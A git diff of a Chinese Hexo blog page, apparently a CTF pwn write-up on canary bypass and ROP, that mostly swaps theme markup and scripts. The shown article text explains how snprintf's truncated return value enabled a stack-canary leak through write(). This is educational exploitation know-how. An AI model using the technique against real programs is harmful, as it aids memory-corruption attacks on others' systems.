 <h2 id="0x06-相关知识补充"><a href="#0x06-相关知识补充" class="headerlink" title="0x06 相关知识补充"></a>0x06 相关知识补充</h2><p><a href="https://wiki.x10sec.org/pwn/mitigation/Canary/#1canary" target="_blank" rel="noopener">CTFWIKI_Canary</a></p>
 <ul>
-<li>不知道大家有没有发现一个问题，关于snprintf函数，为什么我们的write能泄露出Canary？？明明我们只读入了255个字节，snprintf也只是拷贝了256个字节。这牵扯到一个snprintf的问题。<img src="https://s1.ax1x.com/2020/05/13/YUW0Vx.png" srcset="/img/loading.gif" alt=""></li>
+<li>不知道大家有没有发现一个问题，关于snprintf函数，为什么我们的write能泄露出Canary？？明明我们只读入了255个字节，snprintf也只是拷贝了256个字节。这牵扯到一个snprintf的问题。<img src="https://s1.ax1x.com/2020/05/13/YUW0Vx.png" alt=""></li>
 <li>请看官方手册内容：</li>
 </ul>
 <p><em>The functions snprintf() and vsnprintf() do not  write  more than size bytes (including the trailing ’\0’). If the output was truncated due to this limit then the return value is the number of  characters (not including the trailing ’\0’) which would have been written to the final string if enough space had been  available.  Thus,  a  return value  of  size  or more means that the output was truncated.</em></p>
 <ul>
-<li>这段话信息量很大，总结一下就是<strong>如果输出因为size的限制而被截断，返回值将是“如果有足够空间存储，所应能输出的字符数(不包括字符串结尾的’\0’)”，这个值和size相等或者比size大！也就是说，如果可以写入的字符串是”0123456789ABCDEF”共16位，但是size限制了是10，这样 snprintf() 的返回值将会是16 而不是10！</strong><img src="https://s1.ax1x.com/2020/05/13/YUfWpF.png" srcset="/img/loading.gif" alt="">这个过程就很明显了，首先recvbuf放入%s然后和那一串“You say…..”一起放进&amp;s里，<strong>此时size=256，造成截断，返回值大于256！！更通俗来说，在此时snprintf的返回值是：“欲写入的size”，而不是“实际写入的size”</strong>，于是造成了v0 &gt; 256 ，最终让我们达到了泄露Canary的目的。</li>
+<li>这段话信息量很大，总结一下就是<strong>如果输出因为size的限制而被截断，返回值将是“如果有足够空间存储，所应能输出的字符数(不包括字符串结尾的’\0’)”，这个值和size相等或者比size大！也就是说，如果可以写入的字符串是”0123456789ABCDEF”共16位，但是size限制了是10，这样 snprintf() 的返回值将会是16 而不是10！</strong><img src="https://s1.ax1x.com/2020/05/13/YUfWpF.png" alt="">这个过程就很明显了，首先recvbuf放入%s然后和那一串“You say…..”一起放进&amp;s里，<strong>此时size=256，造成截断，返回值大于256！！更通俗来说，在此时snprintf的返回值是：“欲写入的size”，而不是“实际写入的size”</strong>，于是造成了v0 &gt; 256 ，最终让我们达到了泄露Canary的目的。</li>
 </ul>
 
-            </article>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/Canary-PIE/">Canary && PIE</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <div class="post-prev col-6">
-                    
-                    
-                      <a href="/2020/05/21/%E4%BB%8E%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84pwn%EF%BC%88%E4%BA%91%E7%9B%BE%EF%BC%89%E5%AD%A6%E4%B9%A0UAF%E4%B8%8Efastbin-attack/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </div>
-                  <div class="post-next col-6">
-                    
-                    
-                      <a href="/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/">
-                        <span class="hidden-mobile">从一道菜单题锻炼pwn中的堆技能</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </div>
-                </div>
-              
-            </div>
+      
+    </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Canary-PIE/" rel="tag"># Canary && PIE</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/" rel="next" title="从一道菜单题锻炼pwn中的堆技能">
+                <i class="fa fa-chevron-left"></i> 从一道菜单题锻炼pwn中的堆技能
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/21/%E4%BB%8E%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84pwn%EF%BC%88%E4%BA%91%E7%9B%BE%EF%BC%89%E5%AD%A6%E4%B9%A0UAF%E4%B8%8Efastbin-attack/" rel="prev" title="从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack">
+                从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
-  <div id="tocbot"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-    </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-  
-
-  
-
-  
-
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
-        <span>Fluid</span></a>
-    </div>
-    
-
-    
-
-    
-  </div>
-</footer>
-
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
-
-
-
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
-
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: 'article.markdown-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "canary绕过与ROP.md&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
       
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4"
+               alt="Paxos" />
+          <p class="site-author-name" itemprop="name">Paxos</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">tags</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/OrangeGzY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:guoziyi114@gmail.com" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://stevelee477.github.io/" title="Stevelee477(全栈大佬)" target="_blank">Stevelee477(全栈大佬)</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://minhal.me" title="Minhal(二进制爷爷👴)" target="_blank">Minhal(二进制爷爷👴)</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://a2u13.com" title="A2u13(web爷爷👴)" target="_blank">A2u13(web爷爷👴)</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://zhiaowei.github.io/" title="uranus(web姐姐🧍)" target="_blank">uranus(web姐姐🧍)</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-考查知识点"><span class="nav-number">1.</span> <span class="nav-text">0x01 考查知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-程序概览"><span class="nav-number">2.</span> <span class="nav-text">0x02 程序概览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-攻击思路"><span class="nav-number">3.</span> <span class="nav-text">0x03 攻击思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-攻击过程"><span class="nav-number">4.</span> <span class="nav-text">0x04 攻击过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-exp"><span class="nav-number">5.</span> <span class="nav-text">0x05 exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-相关知识补充"><span class="nav-number">6.</span> <span class="nav-text">0x06 相关知识补充</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paxos</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">
+    NexT.Gemini
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
   </script>
 
 
+  
 
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
+  
 
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
